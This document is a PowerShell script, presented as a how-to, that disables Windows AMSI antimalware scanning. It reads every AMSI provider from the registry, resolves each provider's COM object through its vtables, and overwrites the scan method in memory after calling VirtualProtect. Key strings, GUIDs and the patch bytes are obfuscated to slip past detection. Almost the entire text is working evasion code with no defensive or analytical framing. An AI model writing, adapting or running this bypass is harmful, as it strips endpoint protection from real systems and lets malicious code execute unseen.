# Patching AMSI AntimalwareScanInterface::Scan for all Amsi Providers #
```powershell
#----------------------------------IMPORT
$kernel32 = Add-Type @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
	
	[DllImport("kernel32")]
	public static extern IntPtr GetModuleHandleA(string name);
	
	[DllImport("kernel32")]
	public static extern int GetLastError();
	
	[DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr ekwiam, uint flNewProtect, out uint lpflOldProtect);
}
"@

# Delegate for DllGetClassObject
$delegateType = Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class DelegatesWrapper
{
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate int DllGetClassObjectDelegate(
        ref Guid clsid,
        ref Guid iid,
        out IntPtr ppv
    );
}
"@ -PassThru

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate int CreateInstanceDelegate(
    IntPtr thisPtr,
    IntPtr pUnkOuter,
    ref Guid riid,
    out IntPtr ppvObject
);
"@

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate int CloseDelegate(IntPtr thisPtr, ulong value);
"@



#------------------------RUNTIME
function run {
	[CmdletBinding()]
    param (
        [Parameter(Mandatory)]
        [Guid]$clsid,
		[Parameter(Mandatory)]
        [string]$name
    )
	
	$hModule = [kernel32]::GetModuleHandleA($name)
	if ($hModule -eq [IntPtr]::Zero) { 
		write-warning ("Cannot load DLL {0}" -f $name)
		return $false
	}

	$procPtr =[kernel32]::GetProcAddress($hModule, "DllGetClassObject")
	if ($procPtr -eq [IntPtr]::Zero) { 
		write-warning ("Cannot find DllGetClassObject in {0}" -f $name)
		return $false
	}

	$delType = [DelegatesWrapper+DllGetClassObjectDelegate]
	$del = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
		$procPtr, $delType
	)

	#---------------------------------CREATE INSTANCE
	[IntPtr]$pFactory = [IntPtr]::Zero
	$IID_ICF = [Guid]::Parse(("00000001-{1}{1}-{1}{1}-C{1}0-{0}46" -f ('0'*10), ('0'*2)))
	$hr = $del.Invoke([ref]$clsid, [ref]$IID_ICF, [ref]$pFactory)
	if ($hr -ne 0) {
		write-warning ("DllGetClassObject failed: 0x{0:X8} {1}" -f $hr, $name)
		return $false
	}

	# Read vtable pointer from object
	$vtablePtr = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($pFactory)

	# IClassFactory vtable layout:
	$createInstancePtr = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($vtablePtr, 3 * [IntPtr]::Size)
	$createInstanceDel = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
		$createInstancePtr,
		[Type][CreateInstanceDelegate]
	)

	[IntPtr]$pObj = [IntPtr]::Zero

	$IID_AM = [Guid]::Parse(("{3}2CA{3}FE{4}-FE0{0}-{0}2B1-A5DF-08D4{1}D4D{2}" -f '4', [int]'S'[0], (5*5*5), [char]('c'.tochararray()[0]-1),3))
	$hr = $createInstanceDel.Invoke($pFactory, [IntPtr]::Zero, [ref]$IID_AM, [ref]$pObj)
	if ($hr -ne 0) {
		write-warning ("CreateInstance failed: 0x{0:X8} {1}" -f $hr, $name)
		return $false
	}

	#---------------------------------CREATE CLOSE and DISPLAY delegates

	# Read vtable pointer of the object
	$objVTable = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($pObj)

	$closePtr = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($objVTable, 3 * [IntPtr]::Size)
	$closeDel = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
		$closePtr,
		[Type][CloseDelegate]
	)

	$p = 0
	$arr = '01@ab'.tochararray()
	$nop = [byte]($arr[0])*3
	$b = [byte]($arr[1])
	$e = [byte]($arr[2])*3
	$f = [byte]($arr[3])
	$g = [byte]($arr[4])
	[kernel32]::VirtualProtect($closePtr, [uint32]4, [byte]($arr[2]), [ref]$p)
	[System.Runtime.InteropServices.Marshal]::Copy([Byte[]] ($b, $e, ($g+$f), $nop), 0, $closePtr, 4)
}

#------------------------CONSTANTS

function Cannonicalize-User([string]$in) {
	$user = $in
	$user = $user.replace('er','ma')
	$user = $user.ToCharArray()
	[Array]::Reverse($user)

	$user[3] = [char]($user[3]-12)
	$user -join ""
}
$user = Cannonicalize-User 'user'

$l_names = (Get-Item 'HKLM:\SOFTWARE\Microsoft\').opensubkey($user).opensubkey('providers').getsubkeynames() | foreach { (split-path ((Get-Item ("HKLM:\SOFTWARE\classes\clsid\{0}" -f $_)).opensubkey(("in{1}server{0}" -f [byte]" "[0], "proc")).GetValue('').Trim('"')) -leaf) } 
$l_names = @($l_names)

$l_guids = (Get-Item 'HKLM:\SOFTWARE\Microsoft\').opensubkey($user).opensubkey('providers').getsubkeynames()
for($i = 0; $i -lt $l_names.Count; $i++) { 
	Run -clsid $l_guids[$i] -name $l_names[$i]
}
"@
```